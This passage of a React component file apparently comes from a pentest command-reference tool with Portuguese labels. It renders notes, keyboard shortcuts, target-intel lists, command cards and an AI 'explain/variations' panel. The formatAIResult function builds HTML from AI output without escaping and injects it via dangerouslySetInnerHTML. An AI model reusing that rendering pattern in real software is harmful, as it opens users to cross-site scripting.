                style={{padding:"0 12px",border:"1px solid #00ff88",borderRadius:6,color:"#00ff88",fontSize:12,alignSelf:"stretch"}}>
                <I n="plus" s={14}/>
              </button>
            </div>
            {notes.length===0?<p style={{color:"#8b949e",fontSize:13}}>Nenhuma nota ainda.</p>:
              notes.map((n,i)=>(
                <div key={i} style={{marginBottom:8,padding:"8px 10px",background:"#161b22",borderRadius:6,border:"1px solid #21262d"}}>
                  <div style={{display:"flex",justifyContent:"space-between",marginBottom:4}}>
                    <span style={{fontSize:10,color:"#8b949e"}}>{n.at}</span>
                    <button className="btn" onClick={()=>setNotes(ns=>ns.filter((_,j)=>j!==i))} style={{color:"#f85149"}}><I n="trash" s={11}/></button>
                  </div>
                  <p style={{fontSize:12,color:"#c9d1d9",lineHeight:1.6,whiteSpace:"pre-wrap"}}>{n.text}</p>
                </div>
              ))
            }
          </div>
        </div>
      )}

      {/* KEYBOARD SHORTCUTS */}
      {panel==="keys"&&(
        <div className="panel" style={{width:360}}>
          <PanelHeader title="ATALHOS DE TECLADO" color="#8b949e" onClose={()=>setPanel(null)}/>
          <div style={{padding:"0 20px 20px"}}>
            {[
              ["Ctrl+K","Focar na busca"],
              ["Ctrl+B","Toggle sidebar"],
              ["Ctrl+I","Target Intel panel"],
              ["Ctrl+Shift+A","Adicionar comando"],
              ["Ctrl+Shift+F","Favoritos"],
              ["Ctrl+/","Atalhos de teclado"],
              ["Ctrl+→","Próxima categoria"],
              ["Ctrl+←","Categoria anterior"],
              ["Esc","Fechar painel"],
            ].map(([k,d])=>(
              <div key={k} style={{display:"flex",justifyContent:"space-between",padding:"8px 0",borderBottom:"1px solid #21262d",fontSize:12}}>
                <span style={{color:"#8b949e"}}>{d}</span>
                <kbd style={{background:"#161b22",border:"1px solid #30363d",borderRadius:4,padding:"1px 7px",color:"#58a6ff",fontSize:11}}>{k}</kbd>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* AI PANEL */}
      {panel==="ai"&&(
        <>
          <div className="overlay" onClick={()=>{setPanel(null);setAiResult("");}}/>
          <div className="panel" style={{width:500}}>
            <PanelHeader
              title={aiMode==="explain"?"EXPLICAR":aiMode==="suggest"?"VARIAÇÕES":"GERAR COMANDO"}
              color="#bc8cff" onClose={()=>{setPanel(null);setAiResult("");}}/>
            <div style={{padding:"0 20px 20px"}}>
              {aiCmd?.command&&(
                <div style={{background:"#161b22",border:"1px solid #30363d",borderRadius:6,padding:10,marginBottom:14}}>
                  <span style={{fontSize:10,color:"#8b949e",display:"block",marginBottom:3}}>{aiCmd.title}</span>
                  <code style={{fontSize:11,color:"#79c0ff",wordBreak:"break-all"}}>{aiCmd.command}</code>
                </div>
              )}
              {aiLoading
                ?<div style={{display:"flex",gap:10,alignItems:"center",padding:"20px 0",color:"#8b949e",fontSize:13}}><div className="spinner"/>Consultando IA...</div>
                :<div className="ai-result" style={{fontSize:13,lineHeight:1.7}} dangerouslySetInnerHTML={{__html:formatAIResult(aiResult)}}/>
              }
            </div>
          </div>
        </>
      )}
    </div>
  );
}

// ── PANEL HEADER ──────────────────────────────────────────────────────────────
function PanelHeader({title,color,onClose,extra}){
  return(
    <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",padding:"18px 20px 14px",borderBottom:"1px solid #21262d",marginBottom:16,position:"sticky",top:0,background:"#0d1117",zIndex:1}}>
      <span style={{fontFamily:"'Orbitron',monospace",fontSize:12,color,letterSpacing:".05em"}}>{title}</span>
      <div style={{display:"flex",gap:10,alignItems:"center"}}>
        {extra}
        <button className="btn" onClick={onClose} style={{color:"#8b949e"}}><I n="close" s={14}/></button>
      </div>
    </div>
  );
}

// ── INTEL LIST ────────────────────────────────────────────────────────────────
function IntelList({icon,label,color,items,onAdd,onDelete,placeholder}){
  const [val,setVal]=useState("");
  return(
    <div style={{marginBottom:16}}>
      <label style={{fontSize:10,color,display:"flex",alignItems:"center",gap:6,marginBottom:8,letterSpacing:".1em",textTransform:"uppercase",fontWeight:700}}>
        <I n={icon} s={11}/>{label} <span style={{color:"#30363d",fontWeight:400}}>({items.length})</span>
      </label>
      <div style={{display:"flex",gap:6,marginBottom:6}}>
        <input value={val} onChange={e=>setVal(e.target.value)} onKeyDown={e=>{if(e.key==="Enter"&&val.trim()){onAdd(val.trim());setVal("");}}}
          placeholder={placeholder} style={{flex:1,padding:"5px 8px",fontSize:11}}/>
        <button className="btn" onClick={()=>{if(val.trim()){onAdd(val.trim());setVal("");}}}
          style={{padding:"5px 10px",border:`1px solid ${color}`,borderRadius:5,color,fontSize:12}}>+</button>
      </div>
      {items.map((item,i)=>(
        <div key={i} className="list-item">
          <I n={icon} s={11}/>
          <span style={{flex:1,color:"#c9d1d9"}}>{item}</span>
          <button className="btn" onClick={()=>onDelete(i)} style={{color:"#f85149"}}><I n="trash" s={11}/></button>
        </div>
      ))}
    </div>
  );
}

// ── COMMAND CARD ──────────────────────────────────────────────────────────────
function CmdCard({cmd,vars,favs,copied,onCopy,onFav,onAI,onDelete,compact}){
  const resolved=applyVars(cmd.command,vars);
  const hasVars=Object.values(vars).some(v=>v);
  const isFav=favs.has(cmd.id);
  const isCopied=copied===cmd.id;
  return(
    <div className="cmd-card" style={{background:"#0a0c0f",borderRadius:7,padding:compact?"10px 12px":"13px 14px"}}>
      <div style={{display:"flex",alignItems:"flex-start",gap:8}}>
        <div style={{flex:1,minWidth:0}}>
          <div style={{display:"flex",alignItems:"center",gap:6,marginBottom:5,flexWrap:"wrap"}}>
            <span style={{fontSize:12,fontWeight:600,color:"#e6edf3"}}>{cmd.title}</span>
            {cmd.tags.map(t=><span key={t} className={`tag-pill ${TAG_STYLE[t]}`}>{TAG_LABEL[t]}</span>)}
            {!compact&&<span style={{fontSize:9,color:"#30363d",marginLeft:"auto"}}>{cmd.category}</span>}
          </div>
          {cmd.desc&&<p style={{fontSize:11,color:"#8b949e",marginBottom:6}}>{cmd.desc}</p>}
          <code className={`cmd-text${hasVars?" resolved":""}`}>{resolved}</code>
        </div>
        <div style={{display:"flex",flexDirection:"column",gap:3,flexShrink:0}}>
          <button className="btn" onClick={()=>onCopy(cmd.command,cmd.id,cmd.title)}
            style={{padding:"4px 7px",border:"1px solid #30363d",borderRadius:4,color:isCopied?"#00ff88":"#8b949e",background:isCopied?"rgba(0,255,136,.1)":"transparent",display:"flex",alignItems:"center",gap:3,fontSize:10}}>
            {isCopied?<><I n="check" s={11}/>OK</>:<><I n="copy" s={11}/>Copy</>}
          </button>
          <button className="btn" onClick={()=>onFav(cmd.id)}
            style={{padding:"4px 7px",border:"1px solid #30363d",borderRadius:4,color:isFav?"#f7c948":"#8b949e",background:"transparent",fontSize:10}}>
            {isFav?<I n="starF" s={11}/>:<I n="star" s={11}/>}
          </button>
          {!compact&&<>
            <button className="btn" onClick={()=>onAI("explain")} title="Explicar"
              style={{padding:"4px 7px",border:"1px solid #30363d",borderRadius:4,color:"#bc8cff",background:"transparent",fontSize:10}}>
              <I n="ai" s={11}/>
            </button>
            <button className="btn" onClick={()=>onAI("suggest")} title="Variações"
              style={{padding:"3px 5px",border:"1px solid #30363d",borderRadius:4,color:"#58a6ff",background:"transparent",fontSize:9}}>
              ±3
            </button>
          </>}
          {onDelete&&<button className="btn" onClick={()=>onDelete(cmd.id)}
            style={{padding:"4px 7px",border:"1px solid #30363d",borderRadius:4,color:"#f85149",background:"transparent",fontSize:10}}>
            <I n="trash" s={11}/>
          </button>}
        </div>
      </div>
    </div>
  );
}

// ── FORMAT AI RESULT ──────────────────────────────────────────────────────────
function formatAIResult(text){
  if(!text) return "";
  return text
    .replace(/```[\w]*\n?([\s\S]*?)```/g,(_,code)=>`<pre>${code.trim()}</pre>`)
    .replace(/`([^`]+)`/g,"<code>$1</code>")
    .replace(/\*\*(.+?)\*\*/g,"<strong style='color:#e6edf3'>$1</strong>")
    .replace(/###?\s(.+)/g,"<h3>$1</h3>")
    .replace(/\n\n/g,"</p><p>")
    .replace(/\n/g,"<br>")
    .replace(/^/,"<p>").replace(/$/,"</p>");
}
